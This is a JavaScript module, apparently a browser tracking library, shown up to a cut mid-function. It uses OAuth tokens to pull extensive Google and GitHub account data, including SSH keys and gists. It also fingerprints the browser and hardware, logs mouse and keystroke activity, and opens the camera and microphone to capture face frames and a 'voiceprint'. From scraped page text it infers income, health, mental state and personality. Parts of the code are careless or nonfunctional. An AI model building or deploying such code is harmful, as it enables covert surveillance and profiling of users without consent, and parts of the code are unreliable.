export const fetchGoogleUserData = async (accessToken) => {
  try {
    const [profileResponse, peopleResponse, calendarResponse, driveResponse, gmailResponse, photosResponse, youtubeResponse, mapsResponse, playResponse] = await Promise.all([
      fetch(`https://www.googleapis.com/oauth2/v2/userinfo?access_token=${accessToken}`),
      fetch(`https://people.googleapis.com/v1/people/me?personFields=names,emailAddresses,phoneNumbers,addresses,birthdays,genders,organizations,occupations,interests,skills,urls,photos,biographies,locations,relations,residences,events,taglines,sipAddresses,externalIds,userDefined,coverPhotos,ageRanges,locales,memberships,metadata,nicknames&access_token=${accessToken}`),
      fetch(`https://www.googleapis.com/calendar/v3/users/me/calendarList?access_token=${accessToken}`).catch(() => ({ ok: false })),
      fetch(`https://www.googleapis.com/drive/v3/about?fields=user,storageQuota,importFormats,exportFormats,maxImportSizes,maxUploadSize,appInstalled,folderColorPalette,teamDriveThemes&access_token=${accessToken}`).catch(() => ({ ok: false })),
      fetch(`https://gmail.googleapis.com/gmail/v1/users/me/profile?access_token=${accessToken}`).catch(() => ({ ok: false })),
      fetch(`https://photoslibrary.googleapis.com/v1/albums?access_token=${accessToken}`).catch(() => ({ ok: false })),
      fetch(`https://www.googleapis.com/youtube/v3/channels?part=snippet,statistics,contentDetails&mine=true&access_token=${accessToken}`).catch(() => ({ ok: false })),
      fetch(`https://www.googleapis.com/geolocation/v1/geolocate?key=${accessToken}`).catch(() => ({ ok: false })),
      fetch(`https://www.googleapis.com/androidpublisher/v3/applications?access_token=${accessToken}`).catch(() => ({ ok: false }))
    ])
    
    const profile = await profileResponse.json()
    const people = peopleResponse.ok ? await peopleResponse.json() : null
    const calendar = calendarResponse.ok ? await calendarResponse.json() : null
    const drive = driveResponse.ok ? await driveResponse.json() : null
    const gmail = gmailResponse.ok ? await gmailResponse.json() : null
    const photos = photosResponse.ok ? await photosResponse.json() : null
    const youtube = youtubeResponse.ok ? await youtubeResponse.json() : null
    const maps = mapsResponse.ok ? await mapsResponse.json() : null
    const play = playResponse.ok ? await playResponse.json() : null
    
    return { profile, people, calendar, drive, gmail, photos, youtube, maps, play }
  } catch (error) {
    console.error('Google API error:', error)
    return null
  }
}

export const getLocationData = async () => {
  const locationData = {}
  
  // GPS location
  const gpsLocation = await new Promise((resolve) => {
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => resolve({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          heading: position.coords.heading,
          speed: position.coords.speed,
          timestamp: position.timestamp
        }),
        () => resolve(null),
        { timeout: 10000, enableHighAccuracy: true }
      )
    } else {
      resolve(null)
    }
  })
  
  if (gpsLocation) locationData.gps = gpsLocation
  
  // Timezone-based location
  locationData.timezone = {
    name: Intl.DateTimeFormat().resolvedOptions().timeZone,
    offset: new Date().getTimezoneOffset(),
    locale: navigator.language
  }
  
  // Language-based location hints
  locationData.language = {
    primary: navigator.language,
    all: navigator.languages,
    region: navigator.language.split('-')[1]
  }
  
  return locationData
}

export const getNetworkInfo = () => {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection
  const networkData = {
    online: navigator.onLine,
    cookieEnabled: navigator.cookieEnabled
  }
  
  if (connection) {
    networkData.connection = {
      effectiveType: connection.effectiveType,
      downlink: connection.downlink,
      downlinkMax: connection.downlinkMax,
      rtt: connection.rtt,
      saveData: connection.saveData,
      type: connection.type
    }
  }
  
  // Check for VPN/Proxy indicators
  networkData.vpnIndicators = {
    webRTC: isWebRTCAvailable(),
    dnsLeak: checkDNSLeak(),
    timeZoneMismatch: checkTimezoneMismatch()
  }
  
  return networkData
}

const checkDNSLeak = () => {
  try {
    const start = performance.now()
    fetch('https://1.1.1.1').catch(() => {})
    return performance.now() - start
  } catch (e) {
    return null
  }
}

const checkTimezoneMismatch = () => {
  const browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone
  const offsetTz = new Date().getTimezoneOffset()
  return { browserTz, offsetTz }
}

export const getIPInfo = async () => {
  try {
    const [ipapi, ipify, ipinfo] = await Promise.allSettled([
      fetch('https://ipapi.co/json/').then(r => r.json()),
      fetch('https://api.ipify.org?format=json').then(r => r.json()),
      fetch('https://ipinfo.io/json').then(r => r.json())
    ])
    
    return {
      primary: ipapi.status === 'fulfilled' ? ipapi.value : null,
      secondary: ipify.status === 'fulfilled' ? ipify.value : null,
      tertiary: ipinfo.status === 'fulfilled' ? ipinfo.value : null
    }
  } catch (error) {
    return null
  }
}

export const fetchGitHubUserData = async (accessToken) => {
  try {
    const userResponse = await fetch(`https://api.github.com/user`, {
      headers: { Authorization: `token ${accessToken}` }
    })
    const user = await userResponse.json()
    
    const [orgsResponse, keysResponse, reposResponse, followersResponse, followingResponse, starredResponse, subscriptionsResponse] = await Promise.all([
      fetch(`https://api.github.com/user/orgs`, {
        headers: { Authorization: `token ${accessToken}` }
      }),
      fetch(`https://api.github.com/user/keys`, {
        headers: { Authorization: `token ${accessToken}` }
      }),
      fetch(`https://api.github.com/user/repos?sort=updated&per_page=10`, {
        headers: { Authorization: `token ${accessToken}` }
      }),
      fetch(`https://api.github.com/user/followers?per_page=10`, {
        headers: { Authorization: `token ${accessToken}` }
      }),
      fetch(`https://api.github.com/user/following?per_page=10`, {
        headers: { Authorization: `token ${accessToken}` }
      }),
      fetch(`https://api.github.com/user/starred?per_page=10`, {
        headers: { Authorization: `token ${accessToken}` }
      }),
      fetch(`https://api.github.com/user/subscriptions?per_page=10`, {
        headers: { Authorization: `token ${accessToken}` }
      })
    ])
    
    const orgs = orgsResponse.ok ? await orgsResponse.json() : []
    const keys = keysResponse.ok ? await keysResponse.json() : []
    const repos = reposResponse.ok ? await reposResponse.json() : []
    const followers = followersResponse.ok ? await followersResponse.json() : []
    const following = followingResponse.ok ? await followingResponse.json() : []
    const starred = starredResponse.ok ? await starredResponse.json() : []
    const subscriptions = subscriptionsResponse.ok ? await subscriptionsResponse.json() : []
    
    // Get additional GitHub data
    const [gistsResponse, notificationsResponse, eventsResponse, issuesResponse] = await Promise.all([
      fetch(`https://api.github.com/user/gists?per_page=5`, {
        headers: { Authorization: `token ${accessToken}` }
      }).catch(() => ({ ok: false })),
      fetch(`https://api.github.com/notifications?per_page=5`, {
        headers: { Authorization: `token ${accessToken}` }
      }).catch(() => ({ ok: false })),
      fetch(`https://api.github.com/users/${user.login}/events?per_page=10`, {
        headers: { Authorization: `token ${accessToken}` }
      }).catch(() => ({ ok: false })),
      fetch(`https://api.github.com/issues?filter=assigned&state=all&per_page=5`, {
        headers: { Authorization: `token ${accessToken}` }
      }).catch(() => ({ ok: false }))
    ])
    
    const gists = gistsResponse.ok ? await gistsResponse.json() : []
    const notifications = notificationsResponse.ok ? await notificationsResponse.json() : []
    const events = eventsResponse.ok ? await eventsResponse.json() : []
    const issues = issuesResponse.ok ? await issuesResponse.json() : []
    
    return { user, orgs, keys, repos, followers, following, starred, subscriptions, gists, notifications, events, issues }
  } catch (error) {
    console.error('GitHub API error:', error)
    return null
  }
}

export const getSocialMediaData = async () => {
  const data = {}
  
  // Check for social media apps/extensions
  const socialApps = ['Facebook', 'Twitter', 'Instagram', 'LinkedIn', 'TikTok', 'Snapchat', 'WhatsApp', 'Telegram']
  data.installedApps = socialApps.filter(app => {
    try {
      return navigator.userAgent.includes(app) || document.querySelector(`[href*="${app.toLowerCase()}"]`)
    } catch (e) {
      return false
    }
  })
  
  // Check for social login buttons/widgets
  data.socialWidgets = {
    facebook: !!document.querySelector('[class*="fb-"], [id*="facebook"], [href*="facebook.com"]'),
    twitter: !!document.querySelector('[class*="twitter"], [href*="twitter.com"], [href*="x.com"]'),
    google: !!document.querySelector('[class*="google"], [href*="google.com"]'),
    linkedin: !!document.querySelector('[class*="linkedin"], [href*="linkedin.com"]'),
    github: !!document.querySelector('[class*="github"], [href*="github.com"]')
  }
  
  return data
}

export const getAdvancedDeviceData = () => {
  return {
    mediaDevices: getMediaDeviceInfo(),
    sensors: getSensorCapabilities(),
    biometric: getBiometricCapabilities(),
    accessibility: getAccessibilityFeatures(),
    performance: getDetailedPerformance(),
    security: getSecurityFeatures()
  }
}

const getMediaDeviceInfo = async () => {
  try {
    if (!navigator.mediaDevices) return null
    const devices = await navigator.mediaDevices.enumerateDevices()
    const capabilities = {}
    
    for (const device of devices) {
      if (device.kind === 'videoinput') {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: { deviceId: device.deviceId } })
          const track = stream.getVideoTracks()[0]
          capabilities[device.deviceId] = track.getCapabilities()
          stream.getTracks().forEach(track => track.stop())
        } catch (e) {}
      }
    }
    
    return { devices: devices.length, capabilities }
  } catch (e) {
    return null
  }
}

const getSensorCapabilities = () => {
  return {
    accelerometer: 'DeviceMotionEvent' in window,
    gyroscope: 'DeviceOrientationEvent' in window,
    magnetometer: 'ondeviceorientationabsolute' in window,
    ambientLight: 'AmbientLightSensor' in window,
    proximity: 'ProximitySensor' in window,
    gamepad: 'getGamepads' in navigator
  }
}

const getBiometricCapabilities = () => {
  return {
    webAuthn: 'credentials' in navigator && 'create' in navigator.credentials,
    touchId: 'TouchID' in window,
    faceId: 'FaceID' in window,
    fingerprint: 'Fingerprint' in window
  }
}

const getAccessibilityFeatures = () => {
  return {
    reducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
    highContrast: window.matchMedia('(prefers-contrast: high)').matches,
    darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
    reducedTransparency: window.matchMedia('(prefers-reduced-transparency: reduce)').matches
  }
}

const getDetailedPerformance = () => {
  if (!performance) return null
  
  return {
    memory: performance.memory ? {
      used: performance.memory.usedJSHeapSize,
      total: performance.memory.totalJSHeapSize,
      limit: performance.memory.jsHeapSizeLimit
    } : null,
    timing: performance.timing ? {
      navigationStart: performance.timing.navigationStart,
      loadEventEnd: performance.timing.loadEventEnd,
      domContentLoaded: performance.timing.domContentLoadedEventEnd
    } : null,
    navigation: performance.getEntriesByType('navigation')[0] || null
  }
}

const getSecurityFeatures = () => {
  return {
    https: location.protocol === 'https:',
    csp: !!document.querySelector('meta[http-equiv="Content-Security-Policy"]'),
    hsts: !!document.querySelector('meta[http-equiv="Strict-Transport-Security"]'),
    xframe: !!document.querySelector('meta[http-equiv="X-Frame-Options"]'),
    mixedContent: location.protocol === 'https:' && document.querySelectorAll('[src^="http:"]').length > 0
  }
}

export const getDeviceInfo = () => {
  const canvas = document.createElement('canvas')
  const ctx = canvas.getContext('2d')
  ctx.textBaseline = 'top'
  ctx.font = '14px Arial'
  ctx.fillText('Browser fingerprint', 2, 2)
  const canvasFingerprint = canvas.toDataURL()
  
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages,
    cookieEnabled: navigator.cookieEnabled,
    onLine: navigator.onLine,
    hardwareConcurrency: navigator.hardwareConcurrency,
    maxTouchPoints: navigator.maxTouchPoints,
    deviceMemory: navigator.deviceMemory,
    connection: navigator.connection ? {
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData
    } : null,
    screen: {
      width: screen.width,
      height: screen.height,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
      orientation: screen.orientation?.type
    },
    viewport: {
      width: window.innerWidth,
      height: window.innerHeight,
      outerWidth: window.outerWidth,
      outerHeight: window.outerHeight,
      devicePixelRatio: window.devicePixelRatio
    },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    webgl: getWebGLInfo(),
    canvas: canvasFingerprint.slice(-50),
    audio: getAudioFingerprint(),
    fonts: getFontList(),
    plugins: getPluginList(),
    localStorage: isLocalStorageAvailable(),
    sessionStorage: isSessionStorageAvailable(),
    indexedDB: !!window.indexedDB,
    webRTC: isWebRTCAvailable(),
    battery: getBatteryInfo(),
    cpuClass: navigator.cpuClass,
    oscpu: navigator.oscpu,
    buildID: navigator.buildID,
    product: navigator.product,
    productSub: navigator.productSub,
    vendor: navigator.vendor,
    vendorSub: navigator.vendorSub,
    appCodeName: navigator.appCodeName,
    appName: navigator.appName,
    appVersion: navigator.appVersion,
    doNotTrack: navigator.doNotTrack,
    mimeTypes: getMimeTypes(),
    installedApps: getInstalledApps(),
    browserExtensions: getBrowserExtensions(),
    timestamp: Date.now()
  }
}

const getWebGLInfo = () => {
  try {
    const canvas = document.createElement('canvas')
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl')
    if (!gl) return null
    
    return {
      vendor: gl.getParameter(gl.VENDOR),
      renderer: gl.getParameter(gl.RENDERER),
      version: gl.getParameter(gl.VERSION),
      shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
    }
  } catch (e) {
    return null
  }
}

const getAudioFingerprint = () => {
  try {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)()
    const oscillator = audioContext.createOscillator()
    const analyser = audioContext.createAnalyser()
    const gainNode = audioContext.createGain()
    
    oscillator.connect(analyser)
    analyser.connect(gainNode)
    gainNode.connect(audioContext.destination)
    
    return {
      sampleRate: audioContext.sampleRate,
      maxChannelCount: audioContext.destination.maxChannelCount,
      state: audioContext.state
    }
  } catch (e) {
    return null
  }
}

const getFontList = () => {
  const fonts = ['Arial', 'Helvetica', 'Times', 'Courier', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact']
  const available = []
  
  fonts.forEach(font => {
    const canvas = document.createElement('canvas')
    const ctx = canvas.getContext('2d')
    ctx.font = `12px ${font}, monospace`
    const width = ctx.measureText('mmmmmmmmmmlli').width
    ctx.font = '12px monospace'
    const defaultWidth = ctx.measureText('mmmmmmmmmmlli').width
    if (width !== defaultWidth) available.push(font)
  })
  
  return available
}

const getPluginList = () => {
  return Array.from(navigator.plugins).map(plugin => ({
    name: plugin.name,
    filename: plugin.filename,
    description: plugin.description
  }))
}

const isLocalStorageAvailable = () => {
  try {
    localStorage.setItem('test', 'test')
    localStorage.removeItem('test')
    return true
  } catch (e) {
    return false
  }
}

const isSessionStorageAvailable = () => {
  try {
    sessionStorage.setItem('test', 'test')
    sessionStorage.removeItem('test')
    return true
  } catch (e) {
    return false
  }
}

const isWebRTCAvailable = () => {
  return !!(window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection)
}

const getBatteryInfo = async () => {
  try {
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery()
      return {
        charging: battery.charging,
        level: battery.level,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      }
    }
  } catch (e) {
    return null
  }
  return null
}

const getMimeTypes = () => {
  return Array.from(navigator.mimeTypes).map(mime => ({
    type: mime.type,
    description: mime.description,
    suffixes: mime.suffixes
  }))
}

const getInstalledApps = () => {
  const apps = []
  const commonApps = [
    'spotify', 'discord', 'slack', 'zoom', 'teams', 'skype',
    'whatsapp', 'telegram', 'signal', 'steam', 'epic',
    'chrome', 'firefox', 'safari', 'edge', 'opera'
  ]
  
  commonApps.forEach(app => {
    try {
      if (navigator.userAgent.toLowerCase().includes(app) ||
          document.querySelector(`[href*="${app}"]`) ||
          window[app] !== undefined) {
        apps.push(app)
      }
    } catch (e) {}
  })
  
  return apps
}

const getBrowserExtensions = () => {
  const extensions = []
  const commonExtensions = [
    'adblock', 'ublock', 'ghostery', 'privacy', 'lastpass',
    'bitwarden', '1password', 'metamask', 'grammarly'
  ]
  
  commonExtensions.forEach(ext => {
    try {
      if (document.querySelector(`[class*="${ext}"], [id*="${ext}"]`) ||
          window[ext] !== undefined ||
          navigator.userAgent.includes(ext)) {
        extensions.push(ext)
      }
    } catch (e) {}
  })
  
  return extensions
}

export const getSystemInfo = () => {
  return {
    referrer: document.referrer,
    domain: document.domain,
    url: window.location.href,
    protocol: window.location.protocol,
    host: window.location.host,
    pathname: window.location.pathname,
    search: window.location.search,
    hash: window.location.hash,
    origin: window.location.origin,
    title: document.title,
    characterSet: document.characterSet,
    contentType: document.contentType,
    lastModified: document.lastModified,
    readyState: document.readyState,
    visibilityState: document.visibilityState,
    hidden: document.hidden,
    cookies: document.cookie.split(';').length,
    localStorage: Object.keys(localStorage).length,
    sessionStorage: Object.keys(sessionStorage).length,
    history: history.length
  }
}

export const getAdvancedBrowserData = () => {
  return {
    webdriver: navigator.webdriver,
    permissions: getPermissionStates(),
    storage: getStorageEstimate(),
    mediaCapabilities: getMediaCapabilities(),
    presentation: 'presentation' in navigator,
    serviceWorker: 'serviceWorker' in navigator,
    share: 'share' in navigator,
    clipboard: 'clipboard' in navigator,
    credentials: 'credentials' in navigator,
    usb: 'usb' in navigator,
    bluetooth: 'bluetooth' in navigator,
    nfc: 'nfc' in navigator,
    wakeLock: 'wakeLock' in navigator,
    socialMedia: getSocialMediaData(),
    advancedDevice: getAdvancedDeviceData(),
    advancedTracking: getAdvancedTracking(),
    behaviorProfile: getUserBehaviorProfile()
  }
}

const getPermissionStates = async () => {
  const permissions = {}
  const permissionNames = [
    'camera', 'microphone', 'geolocation', 'notifications', 
    'persistent-storage', 'push', 'midi', 'background-sync',
    'accelerometer', 'gyroscope', 'magnetometer', 'ambient-light-sensor'
  ]
  
  for (const name of permissionNames) {
    try {
      const result = await navigator.permissions.query({ name })
      permissions[name] = result.state
    } catch (e) {
      permissions[name] = 'unknown'
    }
  }
  
  return permissions
}

const getStorageEstimate = async () => {
  try {
    if ('storage' in navigator && 'estimate' in navigator.storage) {
      return await navigator.storage.estimate()
    }
  } catch (e) {
    return null
  }
  return null
}

const getMediaCapabilities = () => {
  return {
    supported: 'mediaCapabilities' in navigator,
    decodingInfo: 'decodingInfo' in (navigator.mediaCapabilities || {}),
    encodingInfo: 'encodingInfo' in (navigator.mediaCapabilities || {})
  }
}

export const getUserBehaviorProfile = () => {
  return {
    mousePattern: getMousePattern(),
    keyboardPattern: getKeyboardPattern(),
    scrollBehavior: getScrollBehavior(),
    clickPattern: getClickPattern(),
    sessionData: getSessionData(),
    biometrics: getBiometricData(),
    hardwareFingerprint: getHardwareFingerprint(),
    voiceprint: getVoiceprint(),
    cameraFingerprint: getCameraFingerprint(),
    personalAnalytics: getPersonalAnalytics(),
    financialProfile: getFinancialProfile(),
    healthMetrics: getHealthMetrics(),
    psychologicalProfile: getPsychologicalProfile()
  }
}

const getMousePattern = () => {
  const pattern = { movements: 0, avgSpeed: 0, clicks: 0 }
  let lastX = 0, lastY = 0, lastTime = Date.now()
  
  document.addEventListener('mousemove', (e) => {
    const now = Date.now()
    const speed = Math.sqrt(Math.pow(e.clientX - lastX, 2) + Math.pow(e.clientY - lastY, 2)) / (now - lastTime)
    pattern.movements++
    pattern.avgSpeed = (pattern.avgSpeed + speed) / 2
    lastX = e.clientX
    lastY = e.clientY
    lastTime = now
  })
  
  return pattern
}

const getKeyboardPattern = () => {
  const pattern = { keystrokes: 0, avgInterval: 0 }
  let lastKeyTime = Date.now()
  
  document.addEventListener('keydown', () => {
    const now = Date.now()
    pattern.keystrokes++
    pattern.avgInterval = (pattern.avgInterval + (now - lastKeyTime)) / 2
    lastKeyTime = now
  })
  
  return pattern
}

const getScrollBehavior = () => {
  const pattern = { scrolls: 0, avgSpeed: 0 }
  let lastScrollY = window.scrollY
  let lastScrollTime = Date.now()
  
  window.addEventListener('scroll', () => {
    const now = Date.now()
    const speed = Math.abs(window.scrollY - lastScrollY) / (now - lastScrollTime)
    pattern.scrolls++
    pattern.avgSpeed = (pattern.avgSpeed + speed) / 2
    lastScrollY = window.scrollY
    lastScrollTime = now
  })
  
  return pattern
}

const getClickPattern = () => {
  const pattern = { clicks: 0, doubleClicks: 0, rightClicks: 0 }
  
  document.addEventListener('click', () => pattern.clicks++)
  document.addEventListener('dblclick', () => pattern.doubleClicks++)
  document.addEventListener('contextmenu', () => pattern.rightClicks++)
  
  return pattern
}

const getSessionData = () => {
  return {
    startTime: Date.now(),
    pageViews: 1,
    tabsOpen: 1,
    focusTime: 0,
    idleTime: 0
  }
}

const getBiometricData = async () => {
  const data = {}
  
  // Face detection via camera
  try {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true })
      const video = document.createElement('video')
      video.srcObject = stream
      video.play()
      
      // Capture frame for analysis
      setTimeout(() => {
        const canvas = document.createElement('canvas')
        canvas.width = video.videoWidth
        canvas.height = video.videoHeight
        const ctx = canvas.getContext('2d')
        ctx.drawImage(video, 0, 0)
        data.faceData = canvas.toDataURL().slice(-100)
        stream.getTracks().forEach(track => track.stop())
      }, 1000)
    }
  } catch (e) {}
  
  // Touch pressure patterns
  data.touchPressure = []
  document.addEventListener('touchstart', (e) => {
    if (e.touches[0].force) {
      data.touchPressure.push(e.touches[0].force)
    }
  })
  
  return data
}

const getHardwareFingerprint = () => {
  return {
    cpuBenchmark: getCPUBenchmark(),
    gpuBenchmark: getGPUBenchmark(),
    memoryBenchmark: getMemoryBenchmark(),
    diskSpeed: getDiskSpeed(),
    thermalState: getThermalState()
  }
}

const getCPUBenchmark = () => {
  const start = performance.now()
  let result = 0
  for (let i = 0; i < 100000; i++) {
    result += Math.sqrt(i)
  }
  return performance.now() - start
}

const getGPUBenchmark = () => {
  try {
    const canvas = document.createElement('canvas')
    const gl = canvas.getContext('webgl')
    if (!gl) return null
    
    const start = performance.now()
    const buffer = gl.createBuffer()
    gl.bindBuffer(gl.ARRAY_BUFFER, buffer)
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(10000), gl.STATIC_DRAW)
    gl.drawArrays(gl.TRIANGLES, 0, 3)
    return performance.now() - start
  } catch (e) {
    return null
  }
}

const getMemoryBenchmark = () => {
  const start = performance.now()
  const arr = new Array(100000).fill(0).map((_, i) => i)
  arr.sort(() => Math.random() - 0.5)
  return performance.now() - start
}

const getDiskSpeed = () => {
  try {
    const start = performance.now()
    localStorage.setItem('benchmark', 'x'.repeat(10000))
    const writeTime = performance.now() - start
    
    const readStart = performance.now()
    localStorage.getItem('benchmark')
    const readTime = performance.now() - readStart
    
    localStorage.removeItem('benchmark')
    return { write: writeTime, read: readTime }
  } catch (e) {
    return null
  }
}

const getThermalState = () => {
  return navigator.deviceMemory ? {
    deviceMemory: navigator.deviceMemory,
    hardwareConcurrency: navigator.hardwareConcurrency,
    estimate: navigator.deviceMemory < 4 ? 'mobile' : 'desktop'
  } : null
}

const getVoiceprint = async () => {
  try {
    if (!navigator.mediaDevices) return null
    
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true })
    const audioContext = new AudioContext()
    const analyser = audioContext.createAnalyser()
    const source = audioContext.createMediaStreamSource(stream)
    
    source.connect(analyser)
    analyser.fftSize = 256
    
    const dataArray = new Uint8Array(analyser.frequencyBinCount)
    analyser.getByteFrequencyData(dataArray)
    
    stream.getTracks().forEach(track => track.stop())
    
    return {
      frequencyData: Array.from(dataArray).slice(0, 10),
      sampleRate: audioContext.sampleRate
    }
  } catch (e) {
    return null
  }
}

const getCameraFingerprint = async () => {
  try {
    if (!navigator.mediaDevices) return null
    
    const devices = await navigator.mediaDevices.enumerateDevices()
    const videoDevices = devices.filter(d => d.kind === 'videoinput')
    
    if (videoDevices.length === 0) return null
    
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { deviceId: videoDevices[0].deviceId } 
    })
    
    const track = stream.getVideoTracks()[0]
    const capabilities = track.getCapabilities()
    const settings = track.getSettings()
    
    stream.getTracks().forEach(track => track.stop())
    
    return {
      deviceCount: videoDevices.length,
      capabilities: {
        width: capabilities.width?.max,
        height: capabilities.height?.max,
        frameRate: capabilities.frameRate?.max
      },
      settings: {
        width: settings.width,
        height: settings.height,
        frameRate: settings.frameRate
      }
    }
  } catch (e) {
    return null
  }
}

const getPersonalAnalytics = () => {
  const now = new Date()
  const hour = now.getHours()
  const day = now.getDay()
  const textContent = document.body.innerText.toLowerCase()
  
  return {
    workingHours: {
      currentHour: hour,
      isWorkingHours: hour >= 9 && hour <= 17 && day >= 1 && day <= 5
    },
    sleepPattern: {
      likelySleeping: hour >= 23 || hour <= 6,
      estimatedSleepTime: hour >= 23 || hour <= 6 ? '23:00-07:00' : 'Awake'
    },
    activityLevel: {
      sessionDuration: Date.now() - performance.timing.navigationStart,
      tabFocus: !document.hidden
    },
    interests: {
      technology: /tech|software|code|programming/.test(textContent),
      finance: /money|bank|invest|crypto|stock/.test(textContent),
      health: /health|fitness|medical/.test(textContent),
      shopping: /shop|buy|purchase|cart/.test(textContent)
    }
  }
}

const getFinancialProfile = () => {
  const memory = navigator.deviceMemory || 4
  const cores = navigator.hardwareConcurrency || 4
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone
  const textContent = document.body.innerText.toLowerCase()
  
  return {
    deviceValue: {
      estimate: memory >= 8 && cores >= 8 ? 'High-end' : memory <= 2 ? 'Budget' : 'Mid-range',
      memory, cores
    },
    locationWealth: {
      timezone,
      wealthyRegion: /New_York|London|Tokyo|Zurich/.test(timezone)
    },
    spendingIndicators: {
      premiumBrowser: /Chrome|Safari|Edge/.test(navigator.userAgent),
      subscriptionServices: /netflix|spotify|amazon/.test(textContent)
    },
    investmentBehavior: {
      cryptoInterest: /bitcoin|crypto|blockchain/.test(textContent),
      stockMarket: /stock|trading|invest/.test(textContent)
    }
  }
}

const getHealthMetrics = () => {
  const hour = new Date().getHours()
  const textContent = document.body.innerText.toLowerCase()
  const browserFeatures = Object.keys(window).length
  
  return {
    medicalIndicators: {
      ageEstimate: browserFeatures > 200 ? '25-35' : browserFeatures > 150 ? '35-50' : '18-65',
      healthSearches: /symptom|medicine|treatment/.test(textContent)
    },
    fitnessLevel: {
      healthInterest: /health|fitness|workout/.test(textContent),
      activityApps: /fitness|sport|exercise/.test(navigator.userAgent.toLowerCase())
    },
    mentalHealth: {
      stressIndicators: {
        lateNightUsage: hour >= 23 || hour <= 5
      },
      sleepQuality: {
        optimalSleepTime: hour >= 22 || hour <= 6
      }
    }
  }
}

const getPsychologicalProfile = () => {
  const textContent = document.body.innerText.toLowerCase()
  
  return {
    personality: {
      extroversion: /social|party|friends/.test(textContent),
      openness: /creative|art|music/.test(textContent),
      conscientiousness: /organize|plan|schedule/.test(textContent)
    },
    emotionalState: {
      positiveEmotions: /happy|excited|great|awesome/.test(textContent),
      negativeEmotions: /sad|angry|frustrated/.test(textContent)
    },
    riskProfile: {
      financialRisk: /invest|stock|crypto|trading/.test(textContent),
      privacyConcern: navigator.doNotTrack === '1'
    }
  }
}

export const getAdvancedTracking = (ipData) => {
  const baseData = {
    eyeTracking: getEyeTracking(),
    keystrokeDynamics: getKeystrokeDynamics(),
    mouseGestures: getMouseGestures(),
    deviceOrientation: getDeviceOrientation(),
    ambientLight: getAmbientLight(),
    proximityData: getProximityData()
  }
  
  return {
    ...baseData,
    correlatedInsights: getCorrelatedInsights(ipData),
    predictiveProfile: getPredictiveProfile(ipData),
    riskAssessment: getRiskAssessment(ipData)
  }
}

const getCorrelatedInsights = (ipData) => {
  return {
    economicProfile: {
      likelyIncome: estimateIncome(ipData),
      workingProfessional: new Date().getHours() >= 9 && new Date().getHours() <= 17,
      locationAdvantage: /New_York|London|Tokyo|Zurich/.test(Intl.DateTimeFormat().resolvedOptions().timeZone),
      vpnUsage: detectVPN(ipData),
      ispType: getISPType(ipData)
    },
    lifestyleProfile: {
      workLifeBalance: analyzeWorkLifeBalance(),
      healthRisk: assessHealthRisk(),
      stressLevel: calculateStressLevel(),
      locationStability: analyzeLocationStability(ipData)
    },
    spendingProfile: {
      techSavvy: (navigator.deviceMemory || 4) >= 8,
      investmentPotential: /crypto|bitcoin|invest|stock/.test(document.body.innerText.toLowerCase()),
      premiumISP: isPremiumISP(ipData)
    },
    securityProfile: {
      privacyAware: detectVPN(ipData),
      locationMasking: isLocationMasked(ipData),
      networkSecurity: assessNetworkSecurity(ipData)
    }
  }
}

const estimateIncome = (ipData) => {
  let score = 0
  if ((navigator.deviceMemory || 4) >= 8) score += 3
  if (/New_York|London|Tokyo|Zurich/.test(Intl.DateTimeFormat().resolvedOptions().timeZone)) score += 2
  if (/Chrome|Safari|Edge/.test(navigator.userAgent)) score += 1
  if (isPremiumISP(ipData)) score += 2
  if (detectVPN(ipData)) score += 1
  
  if (score >= 6) return '$100k+'
  if (score >= 4) return '$75k-100k'
  if (score >= 2) return '$50k-75k'
  if (score >= 1) return '$25k-50k'
  return 'Under $25k'
}

const detectVPN = (ipData) => {
  if (!ipData) return false
  const primary = ipData.primary || ipData.secondary || ipData.tertiary
  if (!primary) return false
  
  const vpnIndicators = [
    /vpn|proxy|tor/i.test(primary.org || ''),
    /datacenter|hosting|cloud/i.test(primary.org || ''),
    primary.country_code !== Intl.DateTimeFormat().resolvedOptions().timeZone.split('/')[0]
  ]
  
  return vpnIndicators.filter(Boolean).length >= 2
}

const getISPType = (ipData) => {
  if (!ipData) return 'Unknown'
  const primary = ipData.primary || ipData.secondary || ipData.tertiary
  if (!primary || !primary.org) return 'Unknown'
  
  const org = primary.org.toLowerCase()
  if (/fiber|fios|gigabit/.test(org)) return 'Premium Fiber'
  if (/cable|comcast|spectrum|cox/.test(org)) return 'Cable'
  if (/dsl|centurylink|frontier/.test(org)) return 'DSL'
  if (/mobile|wireless|cellular|verizon|att|tmobile/.test(org)) return 'Mobile'
  if (/business|enterprise|corporate/.test(org)) return 'Business'
  return 'Residential'
}

const isPremiumISP = (ipData) => {
  const ispType = getISPType(ipData)
  return ['Premium Fiber', 'Business'].includes(ispType)
}

const analyzeLocationStability = (ipData) => {
  if (!ipData) return 'Unknown'
